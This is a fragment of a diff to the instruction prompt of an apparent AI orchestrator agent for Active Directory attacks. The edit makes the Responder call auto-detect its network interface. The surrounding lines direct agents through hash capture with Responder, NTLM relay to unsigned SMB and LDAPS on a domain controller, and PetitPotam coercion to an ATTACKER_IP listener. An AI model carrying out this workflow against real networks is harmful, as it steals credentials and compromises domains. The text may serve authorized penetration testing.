@@ -42,7 +42,7 @@ Your role is to **delegate tasks to specialized worker agents** and coordinate t
    - Look for CertEnroll shares or port 443 on CA servers as indicators
 
 5. **Start Coercion/Relay** (when relay targets identified)
-   - `start_coercion(coercion_type="responder", interface="eth0")` - Passive hash capture
+   - `start_coercion(coercion_type="responder")` - Passive hash capture (auto-detects interface)
    - `start_coercion(coercion_type="ntlmrelayx", targets="relay_targets.txt")` - Active relay
    - `start_coercion(coercion_type="petitpotam", target="DC_IP", listener="ATTACKER_IP")` - DC coercion
    - Coordinate with PRIVESC for ESC8 relay attacks
@@ -137,8 +137,8 @@ Port 1433 open -> queue_vulnerability_for_exploitation(vuln_type="mssql_linked_s
 ### PRIORITY 7: NTLM Relay Attacks
 ```
 SMB signing check shows unsigned hosts -> start_coercion workflow:
-  1. start_coercion(coercion_type="responder", interface="eth0")
-     → Capture NetNTLMv2 hashes from LLMNR/NBT-NS
+  1. start_coercion(coercion_type="responder")
+     → Capture NetNTLMv2 hashes from LLMNR/NBT-NS (auto-detects interface)
   2. start_coercion(coercion_type="ntlmrelayx_smb", targets="unsigned_hosts.txt")
      → Relay captured auth to unsigned SMB targets
   3. start_coercion(coercion_type="ntlmrelayx_ldap", target="ldaps://DC_IP")
